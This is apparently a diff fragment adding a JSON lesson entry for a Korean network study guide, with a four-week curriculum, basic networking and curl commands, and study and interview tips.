+    "id": "index",
+    "title": "네트워크 학습 가이드",
+    "category": "network",
+    "subCategory": null,
+    "language": "Text",
+    "description": "네트워크 과목 전체 로드맵입니다",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "🗺️ 네트워크 학습 로드맵",
+        "content": "## 🗺️ 전체 커리큘럼\n\n### 1주차: 기초 다지기\n```\nDay 1-2: 네트워크 기초\n├── 네트워크란?\n├── IP 주소\n├── 포트\n└── DNS\n\nDay 3-4: 프로토콜 이해\n├── OSI 7계층\n├── TCP/IP\n└── TCP vs UDP\n\nDay 5: 실습\n└── ping, traceroute, nslookup 사용\n```\n\n### 2주차: 웹 통신\n```\nDay 1-2: HTTP\n├── HTTP 메서드\n├── 상태 코드\n├── 헤더\n└── HTTPS\n\nDay 3-4: REST API\n├── REST 개념\n├── RESTful 설계\n└── GraphQL 비교\n\nDay 5: 실습\n└── Postman으로 API 테스트\n```\n\n### 3주차: 인증과 보안\n```\nDay 1-2: 인증\n├── 쿠키 vs 세션\n├── JWT\n└── OAuth\n\nDay 3-4: 보안\n├── CORS\n├── Same-Origin Policy\n└── 보안 헤더\n\nDay 5: 실습\n└── 로그인 시스템 구현\n```\n\n### 4주차: 실시간과 심화\n```\nDay 1-2: 실시간 통신\n├── WebSocket\n├── SSE\n└── Long Polling\n\nDay 3-4: 인프라\n├── 로드 밸런싱\n├── CDN\n├── 프록시\n\nDay 5: 종합 실습\n└── 채팅 앱 만들기\n```"
+      },
+      {
+        "type": "code",
+        "title": "💻 핵심 명령어 모음",
+        "content": "### 네트워크 진단\n\n```bash\n# 연결 테스트\nping google.com\n\n# 경로 추적\ntraceroute google.com  # Mac/Linux\ntracert google.com     # Windows\n\n# DNS 조회\nnslookup naver.com\n\n# 내 IP 확인\ncurl ifconfig.me\n\n# 포트 확인\nnetstat -an | grep LISTEN\n```\n\n### HTTP 테스트\n\n```bash\n# GET 요청\ncurl https://api.example.com/users\n\n# POST 요청 (JSON)\ncurl -X POST https://api.example.com/users \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"name\": \"홍길동\"}'\n\n# 헤더 포함\ncurl -H \"Authorization: Bearer token123\" \\\n  https://api.example.com/profile\n\n# 응답 헤더 확인\ncurl -I https://example.com\n```\n\n### 자주 쓰는 코드\n\n```javascript\n// fetch API\nconst response = await fetch('/api/users', {\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/json',\n    'Authorization': 'Bearer ' + token\n  },\n  body: JSON.stringify({ name: '홍길동' })\n});\n\nconst data = await response.json();\n\n// WebSocket\nconst socket = new WebSocket('wss://example.com');\nsocket.onmessage = (e) => console.log(e.data);\nsocket.send('Hello!');\n\n// SSE\nconst events = new EventSource('/events');\nevents.onmessage = (e) => console.log(e.data);\n```"
+      },
+      {
+        "type": "tip",
+        "title": "💡 학습 팁",
+        "content": "### 효과적인 학습법\n\n```\n1. 개념 → 실습 → 프로젝트\n   └── 이론만으론 부족해요!\n\n2. 브라우저 개발자 도구 활용\n   └── Network 탭에서 실시간 확인\n\n3. 작은 프로젝트로 적용\n   ├── 간단한 API 서버\n   ├── 채팅 앱\n   └── 로그인 시스템\n```\n\n### 추천 도구\n\n```\nPostman: API 테스트\nWireshark: 패킷 분석\ncurl: 터미널 HTTP 테스트\nngrok: 로컬 서버 외부 노출\n```\n\n### 면접 준비\n\n```\n1. 핵심 개념 암기\n   └── TCP/UDP, HTTP/HTTPS, REST\n\n2. 동작 원리 이해\n   └── 3-way handshake, DNS 조회\n\n3. 실제 사용 경험\n   └── CORS 해결, JWT 구현\n\n4. 장단점 비교\n   └── 쿠키 vs 세션 vs JWT\n```\n\n### 다음 단계\n\n```\n네트워크 마스터 후:\n├── 시스템 설계\n├── 보안 심화\n├── 클라우드 인프라\n└── DevOps\n```"
+      }
+    ]
+  }
+}
